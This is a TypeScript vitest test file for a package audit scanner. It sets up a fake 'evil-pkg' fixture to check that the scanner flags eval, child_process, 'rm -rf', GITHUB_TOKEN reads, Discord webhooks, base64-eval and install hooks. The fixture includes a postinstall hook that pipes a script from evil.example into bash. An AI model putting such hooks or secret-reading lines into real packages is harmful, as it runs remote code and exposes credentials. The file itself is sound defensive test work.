import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { auditDirectory } from '../electron/lib/scanner';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as os from 'os';

describe('audit scanner', () => {
  let tmp: string;

  beforeAll(async () => {
    tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'audit-test-'));
    await fs.writeFile(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'evil-pkg',
      version: '0.0.1',
      license: 'MIT',
      scripts: { postinstall: 'curl http://evil.example/setup.sh | bash' }
    }, null, 2));

    // Hand-crafted "malicious" file covering several rules.
    const evil = [
      "const cp = require('child_process');",
      "cp.exec('rm -rf /tmp/foo');",
      "eval('1 + 1');",
      "new Function('return 1')();",
      "const token = process.env.GITHUB_TOKEN;",
      "fetch('https://discord.com/api/webhooks/12345/abcdef');",
      "const payload = Buffer.from('Y29uc29sZS5sb2coMSk7Y29uc29sZS5sb2coMik7Y29uc29sZS5sb2coMyk7', 'base64'); eval(payload.toString());",
      "// reach a tor service: example2example2example2.onion",
    ].join('\n');
    await fs.writeFile(path.join(tmp, 'index.js'), evil);

    // A clean file to make sure clean code does not flag.
    await fs.writeFile(path.join(tmp, 'clean.js'), "export function add(a, b) { return a + b; }\n");
  });

  afterAll(async () => {
    await fs.rm(tmp, { recursive: true, force: true });
  });

  it('produces a report with manifest hash and finding counts', async () => {
    const r = await auditDirectory(tmp);
    expect(r.ok).toBe(true);
    expect(r.fileCount).toBeGreaterThanOrEqual(2);
    expect(r.manifest?.name).toBe('evil-pkg');
    expect(r.manifest?.hash).toMatch(/^sha256:[a-f0-9]{64}$/);
    expect(r.summary.critical + r.summary.high + r.summary.medium).toBeGreaterThan(0);
  });

  it('flags eval, child_process, secret read, discord webhook, base64-eval, and lifecycle hook', async () => {
    const r = await auditDirectory(tmp);
    const rules = new Set(r.findings.map(f => f.rule));
    expect(rules.has('eval-call')).toBe(true);
    expect(rules.has('require-eval')).toBe(true);            // require('child_process')
    expect(rules.has('child-spawn')).toBe(true);             // cp.exec(...)
    expect(rules.has('rm-rf')).toBe(true);
    expect(rules.has('env-secret')).toBe(true);
    expect(rules.has('discord-webhook')).toBe(true);
    expect(rules.has('base64-eval')).toBe(true);
    expect(rules.has('tor-onion')).toBe(true);
    expect(rules.has('preinstall-script')).toBe(true);
  });

  it('sorts findings by severity (critical first)', async () => {
    const r = await auditDirectory(tmp);
    const sevOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
    for (let i = 1; i < r.findings.length; i++) {
      expect(sevOrder[r.findings[i].severity]).toBeGreaterThanOrEqual(sevOrder[r.findings[i - 1].severity]);
    }
  });

  it('returns ok:false for nonexistent paths', async () => {
    const r = await auditDirectory(path.join(tmp, 'no-such-dir'));
    expect(r.ok).toBe(false);
    expect(r.error).toBeTruthy();
  });
});
